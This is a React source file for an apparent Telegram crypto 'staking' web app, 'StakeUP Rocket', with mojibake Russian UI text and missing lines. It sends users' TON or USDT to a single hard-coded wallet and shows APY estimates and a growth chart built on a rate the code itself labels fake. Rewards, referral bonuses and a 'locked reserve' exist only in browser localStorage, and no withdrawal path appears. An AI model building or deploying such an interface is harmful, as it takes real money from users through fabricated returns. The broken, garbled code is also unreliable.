  import React, { useEffect, useMemo, useRef, useState } from 'https://esm.sh/react@18.2.0';
  import ReactDOM from 'https://esm.sh/react-dom@18.2.0/client';

  /*************************************************************************

  const MANUAL_WALLET = "UQCAZPmfXSp7qnmwNAECen7phkySJZqvZT3qj6WtEAx30oRe";
  const TELEGRAM_CHANNEL = "https://t.me/+z0kf4aAqT4pjYTJi";

  const TOKENS = [
    { id: "ton", name: "Toncoin", symbol: "TON", min: 0.01 },
    { id: "usdt", name: "USDT (on TON)", symbol: "USDT", min: 1 },
    { id: "surc", name: "SURc (StakeUP)", symbol: "SURc", min: 0 }

  const DURATIONS = [
    { days: 4, label: "4 –¥–Ω—è", apyRange: "8% - 10%" },
    { days: 10, label: "10 –¥–Ω–µ–π", apyRange: "10% - 14%" },
    { days: 30, label: "30 –¥–Ω–µ–π", apyRange: "14% - 18%" },

  const LS = {
    USER: 'stakeup_user_v_final',
    BAL: 'stakeup_bal_v_final',
    STAKES: 'stakeup_stakes_v_final',
    ADDR: 'stakeup_addr_v_final'
  };

  function read(key, fallback) {
    try { const v = localStorage.getItem(key); return v ? JSON.parse(v) : fallback; } catch { return fallback; }
  }
  function write(key, value) {
    try { localStorage.setItem(key, JSON.stringify(value)); } catch {}
  }
  function uid() { return Math.random().toString(36).slice(2,10); }
  function short(addr) { if (!addr) return '-'; return addr.slice(0,6) + '...' + addr.slice(-5); }
  function round(n) { return Math.round((n||0) * 1000000) / 1000000; }

  function estimateRewards(amount, apyRange, days) {
    try {
      const parts = apyRange.replace(/%/g,'').split('-').map(p => parseFloat(p));
      const apy = (parts[0] + parts[1]) / 2;
      const daily = apy / 100 / 365;
      const r = amount * daily * days;
      return Number(r.toFixed(6));
    } catch { return 0; }
  }

  /***********************
   * Main App component
   ***********************/
  function App() {
    // TonConnect
    const [ton, setTon] = useState(null);
    const [connected, setConnected] = useState(!!read(LS.ADDR, null));
    const [addr, setAddr] = useState(read(LS.ADDR, null));

    // UI & flow
    const [page, setPage] = useState('home'); // home, stake, wallet, history, stats
    const [token, setToken] = useState(TOKENS[0]);
    const [amount, setAmount] = useState(5);
    const [duration, setDuration] = useState(DURATIONS[1]);
    const [agree, setAgree] = useState(true);
    const [stage, setStage] = useState('ready'); // ready | paying | manual | staked

    // data
    const [user, setUser] = useState(read(LS.USER, { id: uid(), referer: null, subs: false }));
    const [balance, setBalance] = useState(read(LS.BAL, { SURc: 0, fromStakes: 0, fromRef: 0, fromSub: 0 }));
    const [stakes, setStakes] = useState(read(LS.STAKES, [])); // active + history

    // UI helpers
    const [notif, setNotif] = useState(null);
    const chartRef = useRef(null);

    useEffect(()=> write(LS.USER, user), [user]);
    useEffect(()=> write(LS.BAL, balance), [balance]);
    useEffect(()=> write(LS.STAKES, stakes), [stakes]);
    useEffect(()=> write(LS.ADDR, addr), [addr]);

    useEffect(() => {
      // animate header or expand webapp if in Telegram (best-effort)
      try { window.Telegram?.WebApp?.expand?.(); } catch {}
    }, []);

    function notify(text, ms=3500) {
      setNotif(text);
      setTimeout(()=> setNotif(null), ms);
    }

    async function initTonConnect() {
      try {
        const t = new TonConnect({ manifestUrl: window.location.origin + '/manifest.json' });
        setTon(t);
        t.onAccountChanged?.((account) => {
          if (account?.address) { setAddr(account.address); setConnected(true); notify('–ö–æ—à–µ–ª—ë–∫: ' + short(account.address)); }
          else { setAddr(null); setConnected(false); }
        });
        return t;
      } catch (e) {
        console.warn('TonConnect init error', e);
        notify('TonConnect –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –≤ —ç—Ç–æ–º –æ–∫—Ä—É–∂–µ–Ω–∏–∏');
        return null;
      }
    }

    async function connectWallet() {
      try {
        const t = ton || await initTonConnect();
        if (!t) { notify('TonConnect –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω'); return; }
        await t.connect(); // opens wallet modal on supported wallets
        const a = t.account?.address || null;
        if (a) { setAddr(a); setConnected(true); notify('–ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ' + short(a)); }
        else { setConnected(true); notify('–ó–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω (–ø—Ä–æ–≤–µ—Ä—å—Ç–µ –∫–æ—à–µ–ª—ë–∫)'); }
      } catch (e) {
        console.error(e);
        notify('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: ' + (e?.message || e));
      }
    }

    function disconnectWallet() {
      try { ton?.disconnect?.(); } catch {}
      setAddr(null); setConnected(false); setTon(null);
      notify('–û—Ç–∫–ª—é—á–µ–Ω–æ');
    }

    // send via TonConnect
    async function sendTon(amountDecimal) {
      if (!ton) { notify('–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º TonConnect...'); await initTonConnect(); }
      if (!ton) { notify('TonConnect –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω'); return { ok:false }; }
      try {
        const messages = [{ address: MANUAL_WALLET, amount: amountDecimal.toString() }];
        const r = await ton.sendTransaction({ messages });
        return { ok:true, res:r };
      } catch (e) {
        console.error('send error', e);
        return { ok:false, e };
      }
    }

    function createStakeRecord({ tokenId, amount, days, from }) {
      const id = uid();
      const started = Date.now();
      const finish = started + days * 24*3600*1000;
      const apy = duration.apyRange;
      const est = estimateRewards(amount, apy, days);
      const stake = { id, tokenId, amount, days, apy, est, started, finish, from, status: 'active' };
      setStakes(prev => [stake, ...prev].slice(0, 500));
      // credit SURc: 10x for external tokens
      const bonus = tokenId !== 'surc' ? (amount * 10) : 0;
      setBalance(prev => ({ ...prev, SURc: round((prev.SURc||0) + bonus), fromStakes: round((prev.fromStakes||0) + bonus) }));
      notify(`–í–∫–ª–∞–¥ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω ‚Äî –Ω–∞—á–∏—Å–ª–µ–Ω–æ ${bonus} SURc`);
      return stake;
    }

    async function handlePayAndStake() {
      if (!agree) { notify('–ü—Ä–∏–º–∏—Ç–µ —É—Å–ª–æ–≤–∏—è'); return; }
      if (!amount || Number(amount) <= 0) { notify('–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é —Å—É–º–º—É'); return; }
      setStage('paying');

      // If internal token SURc - no blockchain transfer
      if (token.id === 'surc') {
        createStakeRecord({ tokenId:'surc', amount:Number(amount), days:duration.days, from:'internal' });
        setStage('staked');
        return;
      }

      // Try TonConnect
      if (ton) {
        const res = await sendTon(Number(amount));
        if (res.ok) {
          createStakeRecord({ tokenId: token.id, amount: Number(amount), days: duration.days, from: addr || 'wallet' });
          setStage('staked');
          return;
        } else {
          notify('–û–ø–ª–∞—Ç–∞ —á–µ—Ä–µ–∑ –∫–æ—à–µ–ª–µ–∫ –Ω–µ —É–¥–∞–ª–∞—Å—å ‚Äî –ø–µ—Ä–µ–∫–ª—é—á–∞–µ–º –Ω–∞ —Ä—É—á–Ω—É—é –æ–ø–ª–∞—Ç—É');
        }
      }

      // fallback manual
      setStage('manual');
      notify('–†—É—á–Ω–∞—è –æ–ø–ª–∞—Ç–∞: –ø–µ—Ä–µ–≤–µ–¥–∏—Ç–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω—ã–π –∞–¥—Ä–µ—Å –∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ');
    }

    function confirmManualPaid() {
      createStakeRecord({ tokenId: token.id, amount: Number(amount), days: duration.days, from: 'manual' });
      setStage('staked');
    }

    function applyReferral(code) {
      if (!code) { notify('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥'); return; }
      if (user.referer) { notify('–†–µ—Ñ–µ—Ä–∞–ª —É–∂–µ –ø—Ä–∏–º–µ–Ω—ë–Ω'); return; }
      setUser(prev => ({ ...prev, referer: code }));
      setBalance(prev => ({ ...prev, SURc: (prev.SURc||0) + 100, fromRef: (prev.fromRef||0) + 100 }));
      notify('–†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –±–æ–Ω—É—Å: +100 SURc');
    }

    function applySubscription() {
      if (user.subs) { notify('–£–∂–µ –ø–æ–¥–ø–∏—Å–∞–Ω—ã'); return; }
      setUser(prev => ({ ...prev, subs: true }));
      setBalance(prev => ({ ...prev, SURc: (prev.SURc||0) + 50, fromSub: (prev.fromSub||0) + 50 }));
      notify('–ü–æ–¥–ø–∏—Å–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∞ ‚Äî +50 SURc');
    }

    // utility to compute remaining time
    function timeLeft(finish) {
      const diff = finish - Date.now();
      if (diff <= 0) return '–∑–∞–≤–µ—Ä—à–µ–Ω–æ';
      const d = Math.floor(diff / (24*3600*1000));
      const h = Math.floor((diff % (24*3600*1000)) / 3600000);
      const m = Math.floor((diff % 3600000) / 60000);
      return `${d}–¥ ${h}—á ${m}–º`;
    }

    // Chart update (simple demo)
    useEffect(() => {
      const ctx = document.getElementById('growthChart')?.getContext?.('2d');
      if (!ctx) return;
      const labels = Array.from({length: 6}, (_,i) => `T+${i*10}d`);
      const growthRate = 0.02; // fake rate for demo
      const base = Number(amount || 0);
      const data = labels.map((l,i) => round(base * (1 + growthRate * i)));
      if (window._growth_chart) {
        window._growth_chart.data.labels = labels;
        window._growth_chart.data.datasets[0].data = data;
        window._growth_chart.update();
      } else {
        window._growth_chart = new Chart(ctx, {
          type: 'line',
          data: { labels, datasets: [{ label: '–ü—Ä–æ–≥–Ω–æ–∑ —Ä–æ—Å—Ç–∞ –¥–µ–ø–æ–∑–∏—Ç–∞', data, fill: true, tension: 0.3 }] },
          options: { responsive:true, plugins:{ legend:{ display: false } }, scales:{ y:{ beginAtZero:true } } }
        });
      }
    }, [amount]);

    // Referral link
    const refLink = `${window.location.origin}${window.location.pathname}?ref=${user.id}`;

    // reserve pool (10% locked for 100 days) ‚Äî simple demo calculation
    const totalLocked = stakes.reduce((s, x) => s + (x.amount * 0.1), 0); // 10% of each stake
    const totalDistributed = balance.fromStakes + (balance.fromRef||0) + (balance.fromSub||0);

    // periodic small tick to update timers
    useEffect(() => {
      const id = setInterval(()=> { /* trigger re-render for timers */ setNotif(n => n); }, 60_000);
      return () => clearInterval(id);
    }, []);

    // Pages rendering
    return (
      React.createElement('div', { className: 'max-w-7xl mx-auto' },

          React.createElement('div', null,
            React.createElement('h1', { className: 'text-3xl font-bold tracking-tight' }, 'StakeUP Rocket üöÄ'),
            React.createElement('p', { className: 'text-sm text-slate-400' }, 'SURc staking ‚Äî –±—ã—Å—Ç—Ä—ã–µ –¥–µ–ø–æ–∑–∏—Ç—ã –≤ TON / USDT —Å –∫—Ä–∞—Å–∏–≤—ã–º UI')
          ),

              React.createElement('div', { className: 'font-semibold' }, round(balance.SURc||0), ' SURc')

                React.createElement('button', { onClick: connectWallet, className: 'px-4 py-2 rounded-2xl bg-gradient-to-r from-indigo-500 to-purple-500 shadow-lg' }, '–ü–æ–¥–∫–ª—é—á–∏—Ç—å TON'),
                React.createElement('button', { onClick: ()=> { notify('–†—É—á–Ω–æ–π —Ä–µ–∂–∏–º'); setConnected(false); setAddr(null); }, className: 'px-4 py-2 rounded-2xl bg-white/6' }, '–†—É—á–Ω–æ–π')
              )

        // main grid

          // left - staking panel

              React.createElement('div', { className: 'text-xs text-slate-400' }, 'SURc ‚Äî –≤–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –º–æ–Ω–µ—Ç–∞, –≤ —Å–∫–æ—Ä–æ–º –ª–∏—Å—Ç–∏–Ω–≥')
            ),

              TOKENS.map(t => React.createElement('button', {
                key:t.id, onClick: ()=> setToken(t),
                className: `p-3 rounded-xl text-left border ${token.id === t.id ? 'border-indigo-400 bg-indigo-900/20' : 'bg-white/2 border-transparent'}`
              }, React.createElement('div',{className:'font-medium'}, t.name), React.createElement('div',{className:'text-xs text-slate-400'}, `–ú–∏–Ω: ${t.min} ${t.symbol}`)))
            ),

            React.createElement('div', { className: 'mb-4' },
              React.createElement('label', { className: 'text-sm text-slate-300' }, `–°—É–º–º–∞ (${token.symbol})`),
              React.createElement('input', {
                className: 'mt-2 w-full rounded-2xl bg-transparent border border-white/6 p-3',
                type: 'number', min:0, step: 'any', value: amount, onChange: e => setAmount(e.target.value)
              })
            ),

            React.createElement('div', { className: 'mb-4' },
              React.createElement('label', { className: 'text-sm text-slate-300' }, '–°—Ä–æ–∫'),
              React.createElement('div', { className: 'flex gap-3 mt-2' },
                DURATIONS.map(d => React.createElement('button', {
                  key: d.days, onClick: ()=> setDuration(d),
                  className: `px-3 py-2 rounded-lg ${duration.days === d.days ? 'bg-indigo-500/30' : 'bg-white/2'}`
                }, React.createElement('div',{className:'text-sm font-medium'}, d.label), React.createElement('div',{className:'text-xs text-slate-400'}, d.apyRange,' APY')))
              )
            ),

            React.createElement('div', { className: 'mb-4 p-4 rounded-2xl bg-gradient-to-r from-[#071428] to-[#061222] border border-white/6' },
              React.createElement('div', { className: 'flex justify-between items-center mb-2' },
                React.createElement('div', { className: 'text-xs text-slate-400' }, '–û—Ü–µ–Ω–∫–∞ –¥–æ—Ö–æ–¥–∞'),
                React.createElement('div', { className: 'text-sm text-slate-200' }, 'APY: ', duration.apyRange)
              ),
              React.createElement('div', { className: 'text-2xl font-semibold' }, `${amount} ${token.symbol}`),
              React.createElement('div', { className: 'text-sm text-slate-400' }, `–û–∂–∏–¥–∞–µ–º—ã–π –¥–æ—Ö–æ–¥: ${estimateRewards(Number(amount||0), duration.apyRange, duration.days)} ${token.symbol}`)

            React.createElement('div', { className: 'mb-4' },
              React.createElement('label', { className: 'text-sm text-slate-300' }, '–ü—Ä–æ–≥–Ω–æ–∑ —Ä–æ—Å—Ç–∞ (–¥–µ–º–æ)'),
              React.createElement('canvas', { id: 'growthChart', className: 'mt-2 w-full rounded bg-black/20 p-2' })

              React.createElement('label', { htmlFor: 'terms', className: 'text-sm text-slate-300' }, '–Ø —Å–æ–≥–ª–∞—Å–µ–Ω —Å –ø—Ä–∞–≤–∏–ª–∞–º–∏ –ø—Ä–æ–µ–∫—Ç–∞ –∏ –ø–æ–Ω–∏–º–∞—é —Ä–∏—Å–∫–∏.')
            ),

            React.createElement('div', { className: 'flex gap-3 mb-6' },
              React.createElement('button', { onClick: handlePayAndStake, className: 'flex-1 py-3 rounded-2xl bg-gradient-to-r from-green-500 to-emerald-500 font-medium shadow-lg' }, '–û–ø–ª–∞—Ç–∏—Ç—å –∏ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å'),
              React.createElement('button', { onClick: ()=> { setAmount(0); setAgree(false); notify('–°–±—Ä–æ—à–µ–Ω–æ'); }, className: 'px-4 py-3 rounded-2xl bg-white/6' }, '–°–±—Ä–æ—Å')
            ),

            // flows: manual or staked
            stage === 'manual' && React.createElement('div', { className: 'mt-3 p-4 rounded-xl bg-[#071428]/30 border border-white/6' },
              React.createElement('div', { className: 'text-sm text-slate-300 mb-2' }, '–ü–µ—Ä–µ–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –≤—Ä—É—á–Ω—É—é –Ω–∞ –∞–¥—Ä–µ—Å:'),
              React.createElement('div', { className: 'p-3 bg-black/40 rounded mono break-words' }, MANUAL_WALLET),

                React.createElement('button', { onClick: ()=> setStage('ready'), className: 'px-4 py-2 rounded-2xl bg-white/6' }, '–û—Ç–º–µ–Ω–∞')
              )
            ),

            stage === 'staked' && React.createElement('div', { className: 'mt-3 p-4 rounded-2xl bg-gradient-to-r from-[#04202d] to-[#041722] border border-white/6' },

              React.createElement('div', { className: 'text-sm text-slate-400' }, `–°—Ä–æ–∫: ${duration.label}`),
